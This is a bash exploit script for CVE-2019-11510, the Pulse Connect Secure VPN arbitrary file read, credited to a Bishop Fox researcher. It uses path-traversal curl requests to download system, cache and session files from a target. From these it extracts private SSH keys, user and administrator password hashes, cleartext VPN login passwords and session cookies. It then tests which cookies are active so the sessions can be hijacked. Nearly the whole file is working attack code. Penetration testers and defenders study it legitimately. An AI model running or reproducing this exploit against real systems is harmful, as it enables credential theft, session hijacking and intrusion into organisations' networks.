#!/bin/bash

# Script authored by braindead @BishopFox
# Based on research by Orange Tsai and Meh Chang:
#   https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
# Thanks also to Alyssa Herrera and 0xDezzy for additional insights

if [ -z "$1" ] || [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
  echo ""
  echo "[pwn-pulse.sh by braindead @BishopFox]"
  echo ""
  echo "This script extracts private keys, usernames, admin details (including"
  echo "  session cookies) and observed logins (including passwords) from Pulse"
  echo "  Connect Secure VPN files downloaded via CVE-2019-11510."
  echo "It takes the target domain or IP as an argument and will download important"
  echo "  files from the server using the arbitrary file read vulnerability."
  echo "It then greps through the files for sensitive information and dumps it"
  echo "  all into a file named [TARGET]_extractions.txt"
  echo "By default, it will also test each session cookie to see if the session"
  echo "  is currently active (and thus available for hijacking)."
  echo ""
  echo "Usage (download files, extract, and test):"
  echo "  ./pwn-pulse.sh [TARGET DOMAIN/IP]"
  echo ""
  echo "Usage (extract from existing files only):"
  echo "  ./pwn-pulse.sh --no-downloads [TARGET DOMAIN/IP]"
  echo ""
  echo "Usage (skip active session cookie tests):"
  echo "  ./pwn-pulse.sh --no-cookie-tests [TARGET DOMAIN/IP]"
  echo ""
  exit
fi

# Parse command line parameters
downloads=true
testcookies=true

while (( "$#" )); do
  case "$1" in
    --no-downloads)
      downloads=false
      shift
      ;;
    --no-cookie-tests)
      testcookies=false
      shift
      ;;
    -*|--*=) # unsupported flags
      echo "Error: Unsupported flag $1" >&2
      exit 1
      ;;
    *)
      target="$1"
      break
      ;;
  esac
done

echo ""
echo "Target is $target"

# Download files (unless disabled)
if [ "$downloads" = true ]; then
  # Get the product version
  curl -sk https://${target}/dana-na/nc/nc_gina_ver.txt --output ${target}_version
  version=$(grep "PARAM NAME=\"ProductVersion\"" ${target}_version | cut -d '"' -f 4)
  echo "Pulse Connect Secure ${version}"
  # Test whether or not it is vulnerable
  echo -n "Testing arbitrary file read..."
  vuln=$(curl -skIo /dev/null -w "%{http_code}" --path-as-is https://${target}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/)
  if [ "$vuln" == "200" ]; then
    echo "vulnerable!"
  else
    echo "not vulnerable."
    exit
  fi
  echo ""
  # Download three important files
  echo -n "Downloading (1/3)..."
  curl -sk --path-as-is https://${target}/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/ --output ${target}_config
  echo "done"
  echo -n "Downloading (2/3)..."
  curl -sk --path-as-is https://${target}/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/ --output ${target}_cache
  echo "done"
  echo -n "Downloading (3/3)..."
  curl -sk --path-as-is https://${target}/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/ --output ${target}_sessions
  echo "done"
else
  echo "Downloads disabled"
fi

if [ "$testcookies" = false ]; then
  echo "Cookie tests disabled"
fi

echo ""
echo "Extracting product version..."
version=$(grep "PARAM NAME=\"ProductVersion\"" ${target}_version | cut -d '"' -f 4)
echo "Pulse Connect Secure ${version}" >${target}_extractions.txt

echo "Extracting SSH keys..."
echo "SSH keys:" >>${target}_extractions.txt
# Look for private RSA keys used by the VPN server to SSH to other servers
strings ${target}_config | grep -Ezo "[\-]{5}BEGIN PRIVATE KEY[\-]{5}[^\-]*[\-]{5}END PRIVATE KEY[\-]{5}" >>${target}_extractions.txt
echo "" >>${target}_extractions.txt
echo "" >>${target}_extractions.txt

echo "Extracting local user details..."
echo "Local User Details:" >>${target}_extractions.txt
# Look for all users registered on the device itself. This may not include details
#  of users that authenticate externally.
strings ${target}_config | grep "^login_" | cut -c7- | sort -u >${target}_users
>${target}_uids
>${target}_hashes
while IFS= read -r line; do
  strings ${target}_config | grep -A 4 "login_$line" | grep -m 1 useruid | cut -c8- | cut -c -40 | echo "$line:$(cat)" >>${target}_uids
  strings ${target}_config | grep -A 10 "$line" | grep -m 1 danastre | echo "$line:$(cat)" >>${target}_hashes
done<${target}_users
sort -u ${target}_uids -o ${target}_uids
sort -u ${target}_hashes -o ${target}_hashes
(
  echo "Username	Unique ID	Password Hash (md5crypt)"
  echo "--------	---------	------------------------"
  while IFS= read -r uname; do
    uuid=$(grep "$uname:" ${target}_uids | cut -d ':' -f 2)
    uhash=$(grep "$uname:" ${target}_hashes | cut -d ':' -f 2)
    echo "$uname	$uuid	$uhash"
  done<${target}_users
) | column -ts $'\t' >>${target}_extractions.txt
echo "" >>${target}_extractions.txt

echo "Extracting session cookies..."
# Get session cookies and match them to user UIDs and names
>${target}_dsids
strings ${target}_sessions | while IFS= read -r line1; do
  cookie=$(echo "$line1" | grep ^randomVal | cut -c10-)
  if [ ${#cookie} -eq 32 ]; then
    read -r line2
    uid=$(echo "$line2" | grep ^sid | cut -c4- | cut -c-40)
    if [ ${#uid} -eq 40 ]; then
      user=$(grep "$uid" ${target}_uids | tail -1 | cut -d ':' -f 1)
      echo "$user:$uid:$cookie" >>${target}_dsids
    fi
  fi
done
sort -u ${target}_dsids -o ${target}_dsids

echo "Extracting administrator details..."
echo "Administrator Details:" >>${target}_extractions.txt
# This information differs depending on the platform version. First look for
#   "Platform Administrator" (v9.x) - if found, the hash should be one line
#   below and the username should be one line above (it may or may not be 
#   prefixed with "login_"). If that is not found, look for "Administrators"
#   (v8.x) and grab the hash and username (with "login_") from the next 3 lines.
#   There may be multiple administrators.

>${target}_admins
if [[ -n $(grep -s -m1 "Platform Administrator" ${target}_config) ]]; then
  # Get v9 admin details
  user=""
  hash=""
  uid=""
  strings ${target}_config | grep -B2 -A2 "Platform Administrator" | while IFS= read -r line; do
    if [[ "$line" == "--" ]]; then
      user=""
      hash=""
      uid=""
      continue
    elif [[ $line =~ ^login_ ]]; then
      user=$(echo "$line" | cut -c 7-)
    elif [[ $line =~ ^[a-fA-F0-9]{64} ]]; then
      hash=$(echo "$line" | cut -c -64)
    fi
    if [ -n "$user" ] && [ -n "$hash" ]; then
      uid=$(grep "^$user:" ${target}_uids | cut -d ':' -f 2)
      echo "$user:$hash:$uid" >>${target}_admins
      user=""
      hash=""
      uid=""
    fi
  done
else
  # Get v8 admin details
  strings ${target}_config | grep -A3 "^Administrators$" | while IFS= read -r line1; do
    user=""
    hash=""
    if [[ "$line1" == "--" ]]; then
      continue
    fi
    read -r line2
    if [[ "$line2" == "--" ]]; then
      continue
    fi
    read -r line3
    if [[ "$line3" == "--" ]]; then
      continue
    fi
    read -r line4
    if [[ "$line4" == "--" ]]; then
      continue
    fi
    for i in {2..4}; do
      line="line$i"
      if [[ ${!line} =~ ^login_.*$ ]]; then
        user=$(echo "${!line}" | cut -c 7-)
      elif [[ ${!line} =~ ^[a-fA-F0-9]{64}$ ]]; then
        hash="${!line}"
      fi
    done
    if [ -n "$user$hash" ]; then
      # We should have already found the admin user's UID above.
      uid=$(grep "^$user:" ${target}_uids | cut -d ':' -f 2)
      echo "$user:$hash:$uid" >>${target}_admins
    fi
  done
fi

while IFS= read -r line; do
  adminuser=$(echo "$line" | cut -d ':' -f 1)
  adminhash=$(echo "$line" | cut -d ':' -f 2)
  adminuid=$(echo "$line" | cut -d ':' -f 3)
  echo "Username: $adminuser" >>${target}_extractions.txt
  echo "Unique ID: $adminuid" >>${target}_extractions.txt 
  echo "Password Hash (sha256(md5crypt)): $adminhash" >>${target}_extractions.txt
  if [ -n "$adminuid" ]; then
    # These cookies are vulnerable to hijacking when used before they expire
    #   or the user logs out. The admin site must be accessible to use these.
    echo "Session Cookies (DSIDs):" >>${target}_extractions.txt
    if [ "$testcookies" = true ]; then
      # Test for active sessions (unless disabled)
      echo "Testing admin session cookies..."
      while IFS= read -r line; do
        uid=$(echo "$line" | cut -d ':' -f 2)
        if [ "$uid" == "$adminuid" ]; then
          cookie=$(echo "$line" | cut -d ':' -f 3)
          output="$cookie"
          status=$(curl -Iks -b "DSID=$cookie" "https://${target}/dana-admin/misc/dashboard.cgi" | head -1 | cut -d ' ' -f 2)
          if [[ "$status" == "200" ]]; then
            output="$output  **ACTIVE**"
          fi
          echo "$output" >>${target}_extractions.txt
        fi
      done <${target}_dsids
    else
      grep "$adminuid" ${target}_dsids | cut -d ':' -f 3 >>${target}_extractions.txt
    fi
  fi
  echo "" >>${target}_extractions.txt
done <${target}_admins

echo "Extracting observed VPN logins..."
echo "Observed VPN Logins:" >>${target}_extractions.txt
# Look for cached VPN client session authentication details. This will
#  capture local and external authentications in clear text).
(
  echo "Username	Password	Name	Email	Login Time"
  echo "--------	--------	----	----- 	----------"
  strings ${target}_config ${target}_cache | grep -A 35 user@ >${target}_logins
  echo "--" >>${target}_logins
  username=""
  password=""
  name=""
  email=""
  userdn=""
  department=""
  homedir=""
  timestamp=""
  lastuser=""
  while IFS= read -r line; do
    if [[ "$username" != "$lastuser" ]]; then
      # Print session details (not all captured information is shown by default)
      echo "$lastuser	$password	$name	$email	$timestamp"
      lastuser="$username"
      password=""
      name=""
      email=""
      userdn=""
      department=""
      homedir=""
      timestamp=""
    else
      #get the details
      if [[ ! $line =~ user@|userName|userAttr|userDN|localdomain|lastLogin|protocol|password@|^password$|^[0-9]+$|^[a-fA-F0-9]{32}$ ]]; then
        case "$last" in
          user@*|sAMAccountName)
            username=$(echo "$line" | awk '{print tolower($0)}')
            if [ -z "$lastuser" ]; then
              lastuser="$username"
            fi
            ;;
          password@*)
            if [ -z "$password" ]; then
              password="$line"
            fi
            ;;
          mail)
            if [ -z "$email" ]; then
              email="$line"
            fi
            ;;
          userDN@*)
            if [ -z "$name" ]; then
              name="$line"
            fi
            ;;
          userDNText@*)
            if [ -z "$userdn" ]; then
              userdn="$line"
            fi
            ;;
          department)
            if [ -z "$department" ]; then
              department="$line"
            fi
            ;;
          homeDirectory)
            if [ -z "$homedir" ]; then
              homedir="$line"
            fi
            ;;
          radSessionID)
            if [ -z "$timestamp" ]; then
              timestamp=$(echo "$line" | cut -d '"' -f 2)
            fi
            ;;
          *)
            ;;
        esac
      fi
    fi
    last="$line"
  done <${target}_logins
  # Make sure we print the last entry
  if [ -n "$username" ]; then
    echo "$username	$password	$name	$email	$timestamp"
  fi

  # Look for any other usernames and passwords cached in base64
  if [[ $(echo "YQ==" | base64 -d 2>/dev/null) == "a" ]]; then
    b64="d" # GNU base64
  else
    b64="D" # Mac base64
  fi
  strings ${target}_config ${target}_cache | grep -A1 "\!PRIMARY\!" | grep -Ev "^\!PRIMARY\!$|NTLM" | sed '/^--$/d' | while IFS= read -r line; do # gets base64 strings from the same line with !PRIMARY! or on the following line
    i=0
    oldval=""
    newval=""
    valid=1
    while [ $valid -eq 1 ]; do
      let "i+=4"
      oldval="$newval"
      newval=$(echo "${line: -$i}" | base64 -$b64 2>/dev/null)
      if [[ "$newval" == "" ]] || [[ $newval = *[![:ascii:]]* ]]; then
        valid=0
        if [[ "$oldval" != "" ]]; then
          echo "$oldval"
        fi
      fi
    done
  done | sort -u | sed 's/:/	/g'
) | column -ts $'\t' >>${target}_extractions.txt
echo "" >>${target}_extractions.txt

echo "VPN Session Cookies (DSIDs):" >>${target}_extractions.txt
# These cookies are vulnerable to hijacking when used before they expire or
#   the user logs out. Once connected to the VPN, other exploits can be used.
adminuids=( $(while IFS= read -r line; do echo "$line" | cut -d ":" -f 3; done<${target}_admins) )
echo "Value                            User" >>${target}_extractions.txt
echo "-----                            ----" >>${target}_extractions.txt
if [ "$testcookies" = true ]; then
  # Test for active sessions (unless disabled)
  echo "Testing client session cookies..."
  while IFS= read -r line; do
  	uid=$(echo "$line" | cut -d ':' -f 2)
  	# Skip admins
  	skip=false
  	for adminuid in "${adminuids[@]}"; do
  	  if [[ "$uid" == "$adminuid" ]]; then
  		  skip=true
  	  fi
	done
	if [ "$skip" = false ]; then
	  user=$(echo "$line" | cut -d ':' -f 1)
	  cookie=$(echo "$line" | cut -d ':' -f 3)
	  output="$cookie $user" >>${target}_extractions.txt
	  status=$(curl -Iks -b "DSID=$cookie" "https://${target}/dana/home/index.cgi" | head -1 | cut -d ' ' -f 2)
	  if [[ "$status" == "200" ]]; then
      output="$output  **ACTIVE**" >>${target}_extractions.txt
	  fi
	  echo "$output" >>${target}_extractions.txt
	fi
  done <${target}_dsids
else
  guids=$( IFS='|'; echo "${adminuids[*]}" )
  grep -Ev "$guids" ${target}_dsids | awk '{ split($0,a,":"); print a[3], a[1] }' >>${target}_extractions.txt
fi
echo "" >>${target}_extractions.txt

echo "Done."
echo ""
cat ${target}_extractions.txt
